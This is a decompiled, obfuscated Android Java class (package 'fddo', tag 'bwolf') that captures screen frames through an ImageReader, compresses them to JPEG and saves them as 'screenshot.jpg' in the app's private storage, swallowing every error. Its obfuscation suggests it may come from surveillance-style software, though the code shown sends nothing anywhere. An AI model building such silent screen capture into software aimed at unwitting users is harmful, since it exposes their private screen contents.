package fddo;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Point;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaScannerConnection;
import android.view.Display;
import android.view.Surface;

import com.sonnokta.p067x;
import com.sonnokta.utils.LogUtil;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

/* renamed from: fddo.catch  reason: invalid class name */
public class Ccatch implements ImageReader.OnImageAvailableListener {
    private static String TAG = "bwolf-Ccatch";

    /* renamed from: goto  reason: not valid java name */
    private static boolean f35goto;

    /* renamed from: case  reason: not valid java name */
    final Context f36case;

    /* renamed from: else  reason: not valid java name */
    private p067x f37else;

    /* renamed from: fddo  reason: collision with root package name */
    private final boolean f109fddo = true;

    /* renamed from: for  reason: not valid java name */
    private Bitmap f38for = null;
    private ImageReader ifdf = null;

    /* renamed from: new  reason: not valid java name */
    private int f39new;

    /* renamed from: try  reason: not valid java name */
    private int f40try;

    /* renamed from: fddo.catch$fddo */
    class fddo extends Thread {

        /* renamed from: fddo  reason: collision with root package name */
        final /* synthetic */ byte[] f110fddo;

        fddo(byte[] bArr) {
            this.f110fddo = bArr;
        }

        public void run() {
            File file = new File(Ccatch.this.f36case.getApplicationInfo().dataDir, "screenshot.jpg");
            try {
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                fileOutputStream.write(this.f110fddo);
                fileOutputStream.flush();
                fileOutputStream.getFD().sync();
                fileOutputStream.close();
                MediaScannerConnection.scanFile(Ccatch.this.f36case, new String[]{file.getAbsolutePath()}, new String[]{"image/jpg"}, (MediaScannerConnection.OnScanCompletedListener) null);
            } catch (Exception unused) {
            }
        }
    }

    public Ccatch(p067x p067x) {
        this.f37else = p067x;
        Context applicationContext = p067x.getApplicationContext();
        this.f36case = applicationContext;
        try {
            m54new();
            f35goto = Cgoto.thgjpsmfghokamdgpjkmdghkmf(applicationContext);
            ImageReader imageReader = this.ifdf;
            if (imageReader != null) {
                imageReader.close();
            }
            @SuppressLint("WrongConstant") ImageReader newInstance = ImageReader.newInstance(this.f39new, this.f40try, 1, 2);
            this.ifdf = newInstance;
            newInstance.setOnImageAvailableListener(this, this.f37else.m45for());
        } catch (Exception unused) {
        }
    }

    public int fddo() {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        return this.f40try;
    }

    /* renamed from: for  reason: not valid java name */
    public int m53for() {
        LogUtil.showErrorLog(TAG, "--- m53for ---");
        return this.f39new;
    }

    public Surface ifdf() {
        LogUtil.showErrorLog(TAG, "--- ifdf ---");
        return this.ifdf.getSurface();
    }

    /* renamed from: new  reason: not valid java name */
    public void m54new() {
        LogUtil.showErrorLog(TAG, "--- m54new ---");
        Display defaultDisplay = this.f37else.m46new().getDefaultDisplay();
        Point point = new Point();
        defaultDisplay.getSize(point);
        this.f39new = point.x;
        int i = point.y;
        while (true) {
            this.f40try = i;
            int i2 = this.f39new;
            int i3 = this.f40try;
            if (i2 * i3 > 524288) {
                this.f39new = i2 >> 1;
                i = i3 >> 1;
            } else {
                return;
            }
        }
    }

    public void onImageAvailable(ImageReader imageReader) {
        LogUtil.showErrorLog(TAG, "--- onImageAvailable ---");
        try {
            m55try(imageReader);
        } catch (Exception unused) {
        }
    }

    /* renamed from: try  reason: not valid java name */
    public void m55try(ImageReader imageReader) {
        LogUtil.showErrorLog(TAG, "--- m55try ---");
        if (Cgoto.thgjpsmfghokamdgpjkmdghkmf(this.f36case) != f35goto) {
            f35goto = Cgoto.thgjpsmfghokamdgpjkmdghkmf(this.f36case);
            Cgoto.s(this.f36case, new Intent(this.f36case, p067x.class).putExtra("code", p067x.f25break).putExtra("intent", p067x.f26catch));
            return;
        }
        Image acquireLatestImage = this.ifdf.acquireLatestImage();
        if (acquireLatestImage != null) {
            Image.Plane[] planes = acquireLatestImage.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            acquireLatestImage.close();
            int i = this.f39new;
            int i2 = i + ((rowStride - (pixelStride * i)) / pixelStride);
            Bitmap bitmap = this.f38for;
            if (bitmap != null) {
                bitmap.recycle();
            }
            Bitmap createBitmap = Bitmap.createBitmap(i2, this.f40try, Bitmap.Config.ARGB_8888);
            this.f38for = createBitmap;
            createBitmap.copyPixelsFromBuffer(buffer);
            Bitmap createBitmap2 = Bitmap.createBitmap(this.f38for, 0, 0, this.f39new, this.f40try);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            createBitmap2.compress(Bitmap.CompressFormat.JPEG, 70, byteArrayOutputStream);
            new fddo(byteArrayOutputStream.toByteArray()).start();
        }
    }
}
